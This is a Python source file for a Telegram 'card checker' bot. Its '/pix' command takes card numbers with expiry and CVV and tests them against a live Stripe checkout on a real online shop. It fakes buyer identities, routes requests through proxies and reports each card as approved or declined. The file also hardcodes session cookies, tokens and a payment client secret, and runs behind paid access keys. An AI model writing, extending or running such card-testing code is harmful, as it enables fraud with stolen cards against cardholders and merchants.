from pyrogram import Client
from pyrogram import filters
import time
import re
import requests
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from datetime import datetime
import json
from gates.textos import *
import random
import string
import asyncio
import os
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌"
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

@Client.on_message(filters.command('pix',prefixes=['.','!','/',',','-','$','%','#']))
async def st(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "pix"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Stank</code>
Gateway: <code>Stripe Stripe Charged $40.00</code>
Estados: <code>❌</code>
Format: <code>/pix cc|month|year|cvv.</code></b>""")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''<b>Command: <code>TP</code>
Gateway: <code>Stripe Charged $40.00</code>
Estados: <code>✅</code>
Format: <code>/pix cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})


    balon= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = requests.post('https://m.stripe.com/6', headers=balon).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    random_data = json.loads(res.text)
    phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
    first_name = random_data['results'][0]['name']['first']
    last_name = random_data['results'][0]['name']['last']
    street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
    city = random_data['results'][0]['location']['city']
    state = random_data['results'][0]['location']['state']
    zip = random_data['results'][0]['location']['postcode']
    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
    reply = await message.reply_text("<b>Cargando proceso...</b>")  
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxy = await verificar_proxies(archivo)
    
    cc = input[0]
    mes = input[1]
    ano = input[2]
    cvv = input[3]
    req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()          
    brand = req['brand']
    country = req['country']
    country_name = req['country_name']
    country_flag = req['country_flag']
    bank = req['bank']
    level = req['level']
    typea  = req['type']
    users = message.from_user.username
    bin = cc[:6]
    moneda = req['country_currencies']
    reqs = requests.get(f"https://lookup.binlist.net/{cc}").json()
    scheme = reqs["scheme"]
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


    x = get_bin_info (cc[0:6])

#-----------------------------------------------------------------------------------------------


    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        proxies =  {
            'http': f'{proxs}', 
            'https': f'{proxs}'
}
        
        
        
        
    url = 'https://bearingsdirect.com/internalapi/v1/checkout/order'

    cookies = {
    'fornax_anonymousId': 'c9dfc3a8-7a40-47df-ab66-ca2bc2ea1202',
    'athena_short_visit_id': '90ce17c0-5a2a-45e2-8a2c-db61fbda6099:1697997537',
    'XSRF-TOKEN': '8905776968b933afce50702c4c0861ec539f2e190ad990787165966fcd291762',
    'SHOP_SESSION_TOKEN': 'f3f9933b-ba9e-452f-a587-59f00eda1abd',
    'ajs_user_id': 'null',
    'ajs_group_id': 'null',
    'ajs_anonymous_id': '%22ef0e9004-14ad-4d66-876c-9b52d88db172%22',
    'popupShownOnceAlready': 'true',
    'STORE_VISITOR': '1',
    'lastVisitedCategory': '366',
    'SHOP_SESSION_ROTATION_TOKEN': 'd91c42984f5126d010f0ea2af7d87ff5e653504e6a95f41f7538c9301efdde81',
    'language': 'en_US',
    'ledgerCurrency': 'USD',
    'apay-session-set': 'p3jGrSzk8sE64zGUYYQtPCsVxv3TOss4TBhviWMlrEgXdnQzr8EfXbfIihFJSpg%3D',
    '__stripe_mid': '6ec2bd26-c3e1-43e2-b80e-725632358107d5d5da',
    '__stripe_sid': 'adab0f37-be61-49a3-9e73-af621a645454297fad',
    'Shopper-Pref': '6E054EECD52148F8DFB82EC5E85918405BD343AB-1698602558124-x%7B%22cur%22%3A%22USD%22%7D',
}

    headers = {
    'authority': 'bearingsdirect.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'es-ES,es;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': 'fornax_anonymousId=c9dfc3a8-7a40-47df-ab66-ca2bc2ea1202; athena_short_visit_id=90ce17c0-5a2a-45e2-8a2c-db61fbda6099:1697997537; XSRF-TOKEN=8905776968b933afce50702c4c0861ec539f2e190ad990787165966fcd291762; SHOP_SESSION_TOKEN=f3f9933b-ba9e-452f-a587-59f00eda1abd; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22ef0e9004-14ad-4d66-876c-9b52d88db172%22; popupShownOnceAlready=true; STORE_VISITOR=1; lastVisitedCategory=366; SHOP_SESSION_ROTATION_TOKEN=d91c42984f5126d010f0ea2af7d87ff5e653504e6a95f41f7538c9301efdde81; language=en_US; ledgerCurrency=USD; apay-session-set=p3jGrSzk8sE64zGUYYQtPCsVxv3TOss4TBhviWMlrEgXdnQzr8EfXbfIihFJSpg%3D; __stripe_mid=6ec2bd26-c3e1-43e2-b80e-725632358107d5d5da; __stripe_sid=adab0f37-be61-49a3-9e73-af621a645454297fad; Shopper-Pref=6E054EECD52148F8DFB82EC5E85918405BD343AB-1698602558124-x%7B%22cur%22%3A%22USD%22%7D',
    'origin': 'https://bearingsdirect.com',
    'pragma': 'no-cache',
    'referer': 'https://bearingsdirect.com/checkout',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'x-checkout-sdk-version': '1.468.0',
    'x-checkout-variant': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2JlYXJpbmdzZGlyZWN0LmNvbSIsImlhdCI6MTY5Nzk5NzYwMywiZG9tYWluIjp7ImNhcnRJZCI6IjI1ODU3YWE1LTdkMWQtNGNiMy05OWQ4LTdkZjAxYjJhYzVhZCIsImNoZWNrb3V0VmFyaWFudCI6Im9wdGltaXplZF9vbmVfcGFnZV9jaGVja291dCJ9fQ.vQk_Whk3yh0m63rXi4dQsoMV2MmcPlbZ_hK7cYwTQio',
    'x-xsrf-token': '8905776968b933afce50702c4c0861ec539f2e190ad990787165966fcd291762',
}

    json_data = {
    'cartId': '25857aa5-7d1d-4cb3-99d8-7df01b2ac5ad',
    'customerMessage': '',
}
    
    response = requests.get(url, headers=headers, json=json_data, cookies=cookies)
    await asyncio.sleep(10)
    #decoded_response = response.text
    #result = json.loads(decoded_response)
    #id = result['id']
    #id2 = result['client_secret']
    url = 'https://api.stripe.com/v1/payment_intents/pi_3O45yBLRxpgotO6b0XAzHXRV/confirm'

    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
    
    time.sleep(10)
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
}

    data = f'payment_method_data[billing_details][email]=nefim503%40gmail.com&payment_method_data[billing_details][address][city]=Street+14&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10014&payment_method_data[billing_details][address][line1]=Rue+des+Boucheries+82b&payment_method_data[billing_details][address][line2]=&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[payment_user_agent]=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2Fbearingsdirect.com&payment_method_data[time_on_page]=54547&payment_method_data[guid]=acd4bb89-70e9-43c7-8695-cbaa3995aaf39be079&payment_method_data[muid]=6ec2bd26-c3e1-43e2-b80e-725632358107d5d5da&payment_method_data[sid]=adab0f37-be61-49a3-9e73-af621a645454297fad&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_nzDqmO2ZvtnSvBbTxrwn61fk&_stripe_account=acct_1GpivZLRxpgotO6b&_stripe_version=2020-03-02%3Balipay_beta%3Dv1%3Blink_beta%3Dv1&client_secret=pi_3O45yBLRxpgotO6b0XAzHXRV_secret_tCAUve3NHN3swIhJqYrx5FM6r'
    
    response = requests.post(url, headers=headers, data=data)

    respo = response.json()
    result2 = response.json()
    if 'error' in result2:
              errormessage = result2['error']['message'] + ' ' + result2['error']['code']
              dedoeError = result2['error']['code']
              
    else:
               errormessage = result2['status']
        
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/+rtV8voEx9vA0ODRh"),
               
            ]
        ]
    )
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
    if 'status' in result2 and result2['status'] == 'succeeded':
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>
""", disable_web_page_preview=True,
            reply_markup=keyboard)
    elif(errormessage=="Your card's security code is incorrect. incorrect_cvc"):
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved CCN! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard)
            
    else:
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Declined! ❌
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard) 
            
